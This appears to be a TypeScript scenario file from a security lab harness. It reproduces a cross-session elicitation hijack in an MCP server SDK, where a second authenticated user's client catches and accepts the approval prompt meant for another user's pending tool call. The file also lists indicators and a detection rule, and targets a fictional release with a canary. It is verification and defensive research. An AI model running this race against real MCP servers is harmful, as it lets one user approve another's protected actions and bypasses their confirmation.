/**
 * Module 03 - deterministic cross-client elicitation hijack.
 *
 * WHAT A REPRODUCTION PROVES: Alice and Bob authenticate with different fabricated credentials and
 * receive different MCP session IDs. Alice opens request ID 1 and waits for an elicitation. Bob then
 * connects and opens his own request ID 1. If one McpServer was unsafely reused, Alice's handler uses
 * the newly installed Bob transport, so Bob receives and accepts the prompt. Alice's original tool
 * call then returns fictional release state marked approved with a benign canary.
 *
 * The server sends a progress notification before Bob connects, eliminating timing guesswork. SDK
 * 1.26.0 should reject the second transport connection instead. The full vulnerable response path
 * remains (verify) until `range verify 03` captures it on the isolated VM.
 */
import { defineScenario } from "../../engine/harness/src/scenario.js";
import {
  InteractiveMcpClient,
  interactiveResultText,
  type InteractiveElicitParams,
} from "../../engine/harness/src/transport/index.js";

const APPROVAL_ID = "release-lab-03";
const APPROVAL_CANARY = "LAB_CANARY_GHOST_APPROVAL_03";

const CONCLUSION_OK =
  "The wire evidence shows two different authenticated users with distinct sessions, yet Bob received " +
  "and accepted the elicitation bound to Alice's already-running tool request. Alice's protected call " +
  "then completed with the fictional release approved. This reproduces the cross-transport race in " +
  "CVE-2026-25536 as a cross-client user-confirmation bypass.";

const CONCLUSION_NO =
  "The second authenticated client could not take ownership of the shared server transport, or the " +
  "elicitation stayed with its initiating client. The protected fictional release was not approved by " +
  "another principal. This is the expected result when the SDK rejects server reuse across transports.";

function delay(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function waitFor<T>(promise: Promise<T>, timeoutMs: number, label: string): Promise<T> {
  let timer: ReturnType<typeof setTimeout> | undefined;
  try {
    return await Promise.race([
      promise,
      new Promise<never>((_resolve, reject) => {
        timer = setTimeout(() => reject(new Error(`${label} timed out`)), timeoutMs);
      }),
    ]);
  } finally {
    if (timer) clearTimeout(timer);
  }
}

async function connectWithStartupRetry(options: Parameters<typeof InteractiveMcpClient.connect>[0]) {
  const deadline = Date.now() + 20_000;
  let lastError: unknown;
  while (Date.now() < deadline) {
    try {
      return await InteractiveMcpClient.connect(options);
    } catch (error) {
      lastError = error;
      await delay(500);
    }
  }
  throw lastError instanceof Error ? lastError : new Error("victim client could not connect");
}

function parseResult(client: InteractiveMcpClient, result: Awaited<ReturnType<InteractiveMcpClient["callTool"]>>) {
  const raw = interactiveResultText(result);
  try {
    return JSON.parse(raw) as Record<string, unknown>;
  } catch {
    return { invalid_result: raw, session_id: client.sessionId };
  }
}

export const scenario = defineScenario({
  title: "Ghost approval through cross-client elicitation routing",
  conclusionOk: CONCLUSION_OK,
  conclusionNo: CONCLUSION_NO,

  iocs(ctx, ok) {
    return {
      endpoints: [new URL(ctx.target.url).pathname],
      methods: ["POST"],
      headers: {
        Authorization: "two different fabricated bearer identities",
        "Mcp-Session-Id": "two distinct sessions",
      },
      userAgent: "two official MCP SDK clients",
      sessionId: null,
      tools: ok
        ? ["request_release_approval", "occupy_response_lane"]
        : ["request_release_approval (second transport rejected or isolated)"],
      sourceHint: "correlate elicitation id across initiating, delivery, and answering principals",
      collector: "not used; impact is fictional in-memory release approval",
      detections: ["ATR-2026-70019 (elicitation id observed under multiple user.id values)"],
    };
  },

  async run(ctx) {
    const { report, target } = ctx;
    const owner = target.ownerPrincipal;
    const attacker = target.attackerPrincipal;
    if (!owner || !attacker) {
      report.fail("The two fabricated principal fixtures are missing");
      return { ok: false, detail: "fixtures=missing", notReproducedWhy: "lab_fixtures_missing" };
    }

    let ownerPromptCount = 0;
    let attackerPrompt: InteractiveElicitParams | null = null;
    let arm!: () => void;
    const armed = new Promise<void>((resolve) => {
      arm = resolve;
    });
    const ownerAbort = new AbortController();
    let ownerClient: InteractiveMcpClient | undefined;
    let attackerClient: InteractiveMcpClient | undefined;
    let ownerCall: ReturnType<InteractiveMcpClient["callTool"]> | undefined;
    let ownerCallSettled = false;

    try {
      report.wireNote("Client A - authenticated release owner");
      report.step(`Connect client A as ${owner.id}`);
      ownerClient = await connectWithStartupRetry({
        url: target.url,
        name: "alice-client",
        authorization: `Bearer ${owner.token}`,
        recorder: report,
        onElicit: () => {
          ownerPromptCount += 1;
          return { action: "decline" };
        },
        onError: (error) => report.warn(`Alice client protocol warning: ${error.message}`),
      });
      if (!ownerClient.sessionId) {
        report.fail("Client A connected without a stateful MCP session id");
        return {
          ok: false,
          detail: "owner_session=missing approved=false",
          notReproducedWhy: "owner_session_missing",
        };
      }
      report.pass(
        `Client A session opened: ${ownerClient.sessionId}`,
        `The fabricated owner ${owner.id} authenticated into session ${ownerClient.sessionId}.`,
      );

      ctx.requireExec();
      report.wireNote("Client A - protected approval request held in flight");
      report.step("Start Alice's protected approval tool call and wait for the server's armed signal");
      ownerCall = ownerClient.callTool(
        "request_release_approval",
        { approval_id: APPROVAL_ID },
        {
          signal: ownerAbort.signal,
          timeoutMs: 15_000,
          onProgress: (progress) => {
            if (progress.message === `approval-armed:${APPROVAL_ID}`) arm();
          },
        },
      );
      await waitFor(armed, 8_000, "owner approval arm signal");
      report.pass(
        "Alice's request is in flight before Bob connects",
        `The owner received progress for ${APPROVAL_ID}; its protected tool request remains pending.`,
      );

      report.wireNote("Client B - different authenticated user and separate session");
      report.step(`Connect client B as ${attacker.id} while Alice's call is pending`);
      try {
        attackerClient = await InteractiveMcpClient.connect({
          url: target.url,
          name: "bob-client",
          authorization: `Bearer ${attacker.token}`,
          recorder: report,
          onElicit: (params) => {
            attackerPrompt = params;
            return { action: "accept", content: { confirm: true } };
          },
          onError: (error) => report.warn(`Bob client protocol warning: ${error.message}`),
        });
      } catch (error) {
        const reason = error instanceof Error ? error.message : String(error);
        if (!/409|transport reuse|shared server/i.test(reason)) throw error;
        report.pass(
          "The server rejected reuse by the second transport",
          `Bob's second connection was refused after Alice armed the workflow: ${reason}`,
        );
        ownerAbort.abort(new Error("second transport rejected"));
        await Promise.allSettled([ownerCall]);
        ownerCallSettled = true;
        return {
          ok: false,
          detail: "second_transport=rejected attacker_prompt=false approved=false",
          notReproducedWhy: "shared_server_transport_reuse_rejected",
        };
      }

      const distinctSessions = Boolean(attackerClient.sessionId) && ownerClient.sessionId !== attackerClient.sessionId;
      if (!distinctSessions) {
        report.fail("Client B did not receive a distinct stateful MCP session id");
        return {
          ok: false,
          detail: "sessions_distinct=false approved=false",
          notReproducedWhy: "client_sessions_not_distinct",
        };
      }
      report.pass(
        `Client B session opened: ${attackerClient.sessionId}`,
        `The fabricated second user ${attacker.id} authenticated into session ${attackerClient.sessionId}.`,
      );

      report.wireNote("Collision - Bob's first tool call holds request ID 1 open");
      report.step("Open Bob's harmless response lane, then observe which client receives Alice's prompt");
      const attackerCall = attackerClient.callTool(
        "occupy_response_lane",
        { approval_id: APPROVAL_ID },
        { timeoutMs: 15_000 },
      );
      const [ownerResult, attackerResult] = await waitFor(
        Promise.all([ownerCall, attackerCall]),
        15_000,
        "cross-client elicitation exchange",
      );
      ownerCallSettled = true;
      const release = parseResult(ownerClient, ownerResult);
      const lane = parseResult(attackerClient, attackerResult);

      const promptRecord = attackerPrompt as unknown as Record<string, unknown> | null;
      const promptMeta = promptRecord?._meta as Record<string, unknown> | undefined;
      const promptMatches = promptMeta?.["lab.meridian/approval-id"] === APPROVAL_ID;
      const approved = release.release_status === "approved" && release.canary === APPROVAL_CANARY;
      const laneReleased = lane.lane === "released";
      const ok = distinctSessions && promptMatches && ownerPromptCount === 0 && approved && laneReleased;

      report.pass(
        "Alice and Bob have distinct authenticated sessions",
        `Session separation held at HTTP: Alice=${ownerClient.sessionId}, Bob=${attackerClient.sessionId}.`,
      );
      if (promptMatches && ownerPromptCount === 0) {
        report.pass(
          "Bob received Alice's elicitation while Alice received none",
          `Bob's client handled the elicitation tagged ${APPROVAL_ID}; Alice's handler count was zero.`,
        );
      } else {
        report.fail("The elicitation did not cross from Alice's workflow to Bob's client");
      }
      if (approved) {
        report.pass(
          `Fictional release approved with ${APPROVAL_CANARY}`,
          `Alice's original tool call returned approved state and benign canary ${APPROVAL_CANARY} after Bob answered.`,
        );
      } else {
        report.fail("Alice's fictional release did not enter approved state");
      }

      return {
        ok,
        detail:
          `sessions_distinct=${distinctSessions} attacker_prompt=${promptMatches} ` +
          `owner_prompt_count=${ownerPromptCount} approved=${approved}`,
        notReproducedWhy: ok ? undefined : "elicitation_remained_bound_to_initiating_client",
      };
    } finally {
      if (!ownerCallSettled) ownerAbort.abort(new Error("scenario cleanup"));
      await Promise.allSettled([ownerCall, attackerClient?.close(), ownerClient?.close()].filter(Boolean));
    }
  },
});
